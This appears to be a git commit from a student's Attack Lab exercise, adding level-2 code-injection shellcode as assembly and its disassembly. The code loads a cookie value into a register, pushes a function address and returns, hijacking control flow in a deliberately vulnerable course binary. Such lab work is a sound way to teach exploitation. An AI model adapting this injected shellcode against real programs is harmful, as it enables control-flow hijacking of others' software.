7407f4588c7a23cf0dfd5891455ffe474bd45bf0
HenrySheep <729100613@qq.com>
2024-09-04 11:06:55 +0000

    level2 finish

---
+++ attack/attacklab_handout/touch2.d
@@ -0,0 +1,10 @@
+
+touch2.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	8b 3c 25 e4 44 60 00 	mov    0x6044e4,%edi
+   7:	68 ec 17 40 00       	pushq  $0x4017ec
+   c:	c3                   	retq   
---
+++ attack/attacklab_handout/touch2.s
@@ -0,0 +1,3 @@
+movl	0x6044e4,%edi
+pushq   $0x4017ec
+ret
